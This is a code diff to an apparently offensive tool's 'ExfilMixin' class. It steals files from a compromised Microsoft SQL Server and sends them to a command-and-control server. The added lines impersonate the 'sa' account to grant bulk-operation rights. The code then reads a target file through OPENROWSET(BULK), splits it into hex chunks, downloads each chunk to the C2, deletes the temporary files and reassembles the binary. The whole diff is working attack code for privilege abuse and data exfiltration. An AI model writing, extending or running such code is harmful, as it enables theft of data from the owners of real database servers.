@@ -258,12 +258,20 @@ class ExfilMixin:
         num_chunks = math.ceil(file_size / (chunk_mb * 1024 * 1024))
         print(f"[*] xpexfil-hex: {file_size} bytes \u2192 {num_chunks} chunk(s)")
 
-        # B \u2014 ONE T-SQL batch: OPENROWSET(BULK) + chunk + hex + INSERT all
+        # B \u2014 grant BULK OPERATIONS (OPENROWSET ignores EXECUTE AS impersonation)
+        self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            f"GRANT ADMINISTER BULK OPERATIONS TO [{self._tsql_escape(self._login)}];")
+
+        # C \u2014 ONE T-SQL batch: OPENROWSET(BULK) + chunk + hex + INSERT all
         insert_tsql = self._build_exfil_insert_tsql(remote_path, chunk_mb)
         print(f"[*] xpexfil-hex: T-SQL INSERT all {num_chunks} chunk(s) ...")
-        self._exec_q(shell, insert_tsql, timeout_s=insert_timeout_s)
+        result = self._exec_q(shell, insert_tsql, timeout_s=insert_timeout_s)
+        if result and 'Msg' in result and 'Level' in result:
+            print(f"[!] xpexfil-hex: T-SQL INSERT failed:\n{result}")
+            return
 
-        # C \u2014 per file-chunk: extract hex text + upload to C2
+        # D \u2014 per file-chunk: extract hex text + upload to C2
         for i in range(num_chunks):
             chunk_local = f"C:\\Windows\\Temp\\{local_name}.hex{i}"
             extract_ps = self._build_exfil_extract_hex_ps(chunk_local, chunk_idx=i)
@@ -274,11 +282,11 @@ class ExfilMixin:
             shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.hex{i}")
             shell.cmd_exec_raw(f"cmd /c del /f {chunk_local}")
 
-        # D \u2014 cleanup exfil table
+        # E \u2014 cleanup exfil table
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
             "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL "
             "DROP TABLE tempdb..exfil;")
 
-        # E \u2014 C2-side: hex decode + assemble binary
+        # F \u2014 C2-side: hex decode + assemble binary
         print(f"[*] xpexfil-hex: assembling {num_chunks} chunk(s) on C2 ...")
         self._assemble_hex_chunks(local_name, num_chunks)
